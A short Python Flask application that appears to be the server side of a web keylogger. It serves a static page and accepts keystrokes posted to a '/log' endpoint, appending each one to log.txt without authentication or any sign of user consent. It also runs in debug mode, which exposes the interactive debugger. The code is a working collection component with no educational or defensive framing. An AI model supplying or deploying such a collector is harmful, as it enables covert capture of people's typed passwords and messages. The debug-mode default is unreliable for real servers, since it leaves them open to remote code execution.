from flask import Flask, request, jsonify
import os

app = Flask(__name__)

@app.route('/')

def index():
    return app.send_static_file('index.html')



@app.route('/log', methods=['POST'])
def log_keystroke():
    data = request.json
    key = data.get('key', '')
    
    with open('log.txt', 'a') as f:
        f.write(key)

    return jsonify({'status': 'success'})

if __name__ == '__main__':
    # Ensure the 'static' folder exists and contains 'index.html'
    if not os.path.exists('static'):
        os.makedirs('static')
    app.run(debug=True)